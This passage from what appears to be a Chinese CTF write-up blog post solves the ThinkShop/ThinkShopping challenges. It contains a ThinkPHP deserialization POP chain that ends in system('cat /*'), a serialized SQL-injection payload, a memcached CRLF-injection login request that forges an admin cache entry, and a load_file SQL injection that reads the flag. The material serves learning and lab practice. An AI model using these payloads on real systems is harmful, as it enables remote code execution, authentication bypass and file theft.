class="hljs-title class_">console</span>\<span class="hljs-title class_">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcache</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcache</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcached</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span>  = [<br>            <span class="hljs-string">&#x27;expire&#x27;</span>       =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;session_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcached</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Request</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-comment">// pop链中需要prefix存在，否则报错</span><br>            <span class="hljs-variable language_">$this</span>-&gt;options = [<span class="hljs-string">&#x27;prefix&#x27;</span>   =&gt; <span class="hljs-string">&#x27;jelly/&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span><br>    &#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">get</span>     = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-variable">$function</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;get = [<span class="hljs-string">&quot;jelly&quot;</span>=&gt;<span class="hljs-variable">$parameter</span>];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>然后通过刚才的注入报文写入<code>data</code>​数据即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>name<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>price<span class="hljs-operator">=</span><span class="hljs-number">100.00</span><span class="hljs-operator">&amp;</span>on_sale_time<span class="hljs-operator">=</span><span class="hljs-number">2023</span><span class="hljs-number">-12</span><span class="hljs-number">-19</span>T11:<span class="hljs-number">11</span><span class="hljs-operator">&amp;</span>image<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>data<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>data`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-string">&#x27;YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJqZWxseSI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6Mzp7czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoiY2F0IC8qIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntpOjA7czowOiIiO319czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoiY2F0IC8qIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX19fX0%3D&#x27;</span><span class="hljs-keyword">where</span>`id`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">=</span>test<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514214.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h1 id="ThinkShopping"><a href="#ThinkShopping" class="headerlink" title="ThinkShopping"></a>ThinkShopping</h1><p>这个题做了一些修改</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514747.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>修改完之后我们先看看修改的内容 其实可以发现他把入口的反序列化点给删除了相反代替的就是echo了一个<code>data</code>​的值</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514843.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>再来查看一下他根目录起的环境是什么</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514093.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>前面是常规的apache+mysql+php 但是在最后一行发现了一个这个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">memcached -d -m 50 -p 11211 -u root<br></code></pre></td></tr></table></figure>
+
+<p>那么其实是存在考核点的</p>
+<p>‍</p>
+<p>最后(<del>看wp</del>)还是有其他修改过的痕迹</p>
+<p>admin的表里面为空了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514188.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>mysql的<code>secure_file_priv</code>​为空了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514277.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>那么前边的sql的点依旧没有删，所以思路就是 进入后台并且通过sql去使用<code>load_file</code>​去读取根目录的flag，但如何进入后台呢？前面提到，容器在启动的时候使用了<code>memcached</code>​,其实这里也是我一开始对<code>thinkshop</code>​有点不太理解的地方(这里贴上跟@up哥的聊天记录)</p>
+<p><img src="C:\Users\Zachariah.Jack\Desktop\tmp_wp_picture\202312281537864-17037490613704.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实这里确实就是这样，<code>find(xx)</code>​会先去<code>cache</code>​获取缓存，断点跟进下<code>find</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514530.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现是以<code>think:shop.admin|username</code>​ 这种形式去获取我们的值，那也就是说，如果我们能伪造一个缓存为admin admin 那么就可以登录后台了吧，由于出题人配置了cache，所以会将数据缓存到<code>memcached</code>​中</p>
+<p>那么如何控制缓存的值呢？memcached存在CRLF注入漏洞，具体可参考下方文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/328384.html">https://www.freebuf.com/vuls/328384.html</a></li>
+</ul>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514855.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>大概了解一下<code>Memcached</code>​命令即可 比如 <code>get</code>​ <code>set</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514954.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>简单来说，如果存在CRLF漏洞的话就可以通过set任意的值来让缓存存在某个<code>value</code>​来达到鉴权成功，例如下方的payload，就能注入一个snowwolf的键，且值为wolf，4代表数据长度</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">%00%0D%0Aset%20admin%200%20500%204%0D%0Aadmin<br>等价于<br><span class="hljs-built_in">set</span> admin 0 500 4<br>admin<br></code></pre></td></tr></table></figure>
+
+<p>我们来测试一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> zjacky 0 500 4<br>jack<br><br>get zjacky<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514048.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>测试下来也是非常容易理解，但现在问题来了，我们要注入一个怎样的数据呢？这里还是引用到@Lxxx datou师傅写的文章了(到底是有多强)</p>
+<p>将下面的内容添加到路由，然后访问执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from admin where id=1&quot;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;think:shop.admin|admin&quot;</span>;<br>    <span class="hljs-title class_">Cache</span>::<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$result</span>, <span class="hljs-number">3600</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到的<code>value</code>​是一个序列化字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">telnet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">11211</span><br>get think:shop.admin|admin<br>a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514148.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /public/index.php/index/admin/do_login.html HTTP/1.1<br>Host: 192.168.0.130:36000<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://192.168.0.130:36000/public/index.php/index/index/index<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 255<br><br>username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin<br></code></pre></td></tr></table></figure>
+
+<p>admin admin登录下后直接写sql语句通过<code>load_file()</code>​读flag出来写到<code>name</code>​字段中即可得到flag</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514247.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=1&amp;name=fake_flag&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3Dunhex(<span class="hljs-string">&#x27;&#x27;</span>)/&lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> data-type=<span class="hljs-string">&quot;strong&quot;</span>&gt;/,`name`%3Dload_file(<span class="hljs-string">&#x27;/fffflllaaaagggg&#x27;</span>)/&lt;/span&gt;/where/&lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> data-type=<span class="hljs-string">&quot;strong&quot;</span>&gt;/id%3D1/&lt;/span&gt;/or/**/1%3D1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>题目感觉还是比较新颖把，emmm其实对比着docker来打还是较为轻松，但是可能自己在半年左右接触的CTF来看很多都没有给dockerfile或者没给镜像就导致了对从镜像去打题目的习惯和小技巧，这两个题还是非常值得复现的，其次就是通过这些题也明白了自己对ThinkPHP非常的不熟悉，曾被自己的师兄(Tsir)骂过: “你TP都不会审个毛啊还审计个毛线啊？” ，也被@up哥骂过：”你**的TP这一眼看过去就能看明白的东西问个**“，还有很多框架还没学，害，好菜，继续学习了要。。。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF - 再谈强网ThinkShop</div>
+      <div>https://zjackky.github.io/post/ctf-talking-about-the-strong-network-thinkshop-z1xtoji.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zjacky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/summary-2023-tdfez.html" title="总结 - 2023年度总结 ">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">总结 - 2023年度总结 </span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/code-audit-net-general-system-audit-24d238.html" title="代码审计 - .NET - 通用系统审计">
+                        <span class="hidden-mobile">代码审计 - .NET - 通用系统审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Zjackky/Zjackky.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Zjackky/Zjackky.github.io" target="_blank" rel="nofollow noopener"><span>My Github</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
